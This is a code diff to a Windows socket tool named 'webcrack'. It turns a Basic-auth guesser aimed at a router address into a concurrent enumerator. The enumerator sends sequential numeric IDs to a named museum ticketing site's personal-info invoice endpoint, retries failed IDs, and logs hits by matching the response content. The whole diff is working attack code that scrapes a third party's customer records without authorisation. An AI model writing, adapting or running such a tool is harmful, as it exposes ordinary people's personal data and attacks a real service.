@@ -2,6 +2,9 @@
 #include <assert.h>
 #include <winsock.h>
 
+#include <list>
+#include <string>
+
 #include "base64.h"
 #include "module.h"
 #include "callout.h"
@@ -13,6 +16,7 @@ static int _total_bytes_in = 0;
 static int _total_bytes_out = 0;
 static slotcb _slot_finish = 0;
 static int webcrack_close(struct webcrack_ctx *ctxp);
+static std::list<int> _failure_list;
 
 static const char *
 get_schema(const char *url, char *schema, size_t len)
@@ -108,9 +112,11 @@ get_url_path(const char *url, char *url_path, size_t len)
 struct webcrack_ctx {
 	int flags;
 	int sockfd;
+	int key_index;
 	int http_head_off;
 	int http_head_len;
 	char *http_head_buf;
+	std::string http_response;
 	struct sockcb *sockcbp;
 	struct waitcb crack_timer;
 	struct waitcb sock_rwait;
@@ -147,7 +153,7 @@ static int webcrack_invoke(struct webcrack_ctx *ctxp)
 		   	}
 
 			if (len > 0) {
-				buf[len] = 0;
+				ctxp->http_response.append(buf, len);
 				_total_bytes_in += len;
 				break;
 			}
@@ -176,12 +182,22 @@ static int webcrack_invoke(struct webcrack_ctx *ctxp)
 static void webcrack_routine(void *upp)
 {
 	int len;
+	const char *bufp;
 	struct webcrack_ctx *ctxp;
 
 	ctxp = (struct webcrack_ctx *)upp;
 	if (webcrack_invoke(ctxp) == 0) {
 		if (WSAGetLastError() != 0)
 		   	fprintf(stderr, "webcrack_close: %d\n", WSAGetLastError());
+		if (ctxp->http_response.size() == 0) {
+			int index = ctxp->key_index;
+			_failure_list.push_back(index);
+		} else {
+		   	bufp = ctxp->http_response.c_str();
+		   	if (strstr(bufp, "option") &&
+				   	strstr(bufp, "value=\"2011-06-06\""))
+			   	fprintf(stderr, "success: %d\n", ctxp->key_index);
+		}
 		webcrack_close(ctxp);
 		_webcrack_ref--;
 	}
@@ -214,7 +230,7 @@ get_auth_val(const char *user, const char *pass, char *buf, size_t len)
 }
 
 struct webcrack_ctx *
-webcrack_create(const char *url, const char *user, const char *pass)
+webcrack_create(const char *url, const char *user, const char *pass, int index)
 {
 	int error;
 	char schema[8];
@@ -241,9 +257,8 @@ webcrack_create(const char *url, const char *user, const char *pass)
 	   	sprintf(http_head_buf, 
 			"GET %s HTTP/1.1\r\n"
 			"Connection: close\r\n"
-			"Authorization: Basic %s\r\n"
 			"Host: %s\r\n"
-			"\r\n", url_path, auth_val, hostname);
+			"\r\n", url_path,  hostname);
 	   	strncat(hostname, ":", sizeof(hostname));
 	   	strncat(hostname, porttext, sizeof(hostname));
 	} else {
@@ -252,9 +267,8 @@ webcrack_create(const char *url, const char *user, const char *pass)
 	   	sprintf(http_head_buf, 
 			"GET %s HTTP/1.1\r\n"
 			"Connection: close\r\n"
-			"Authorization: Basic %s\r\n"
 			"Host: %s\r\n"
-			"\r\n", url_path, auth_val, hostname);
+			"\r\n", url_path,  hostname);
 	}
 
 	error = getaddrbyname(hostname, &addr_in1);
@@ -262,6 +276,7 @@ webcrack_create(const char *url, const char *user, const char *pass)
 
 	ctxp = new webcrack_ctx;
 	ctxp->flags = 0;
+	ctxp->key_index = index;
 	ctxp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	assert(ctxp->sockfd != -1);
 	ctxp->http_head_off = 0;
@@ -325,12 +340,29 @@ static void auth_callback(void *upp)
 	int i;
 	int old_ref = _webcrack_ref;
 	struct webcrack_ctx * ctxp;
-   	const char * url = "http://192.168.1.1/";
+	static int start_num = 11940000;
+   	const char * url = "http://ticket.hnmuseum.com/online/invoiceNetPersonInfo.do?bean.startdate=%u";
 	slot_record(&_slot_finish, &_auth_finish);
 
-	for (i = 0; old_ref + i < 5; i++)
-	   	if (webcrack_create(url, "admin", "hello"))
+	for (i = 0; old_ref + i < 5; i++) {
+		char buf[8192];
+
+		if (!_failure_list.empty()) {
+			start_num = *_failure_list.begin();
+		   	sprintf(buf, url, start_num);
+		   	if (webcrack_create(buf, "admin", "hello", start_num)) {
+				_failure_list.erase(_failure_list.begin());
+			   	_total_auth_count++;
+		   	}
+			continue;
+		}
+
+		sprintf(buf, url, start_num);
+		if (webcrack_create(buf, "admin", "hello", start_num)) {
 			_total_auth_count++;
+			start_num++;
+		}
+	}
 }
 
 void module_init(void)
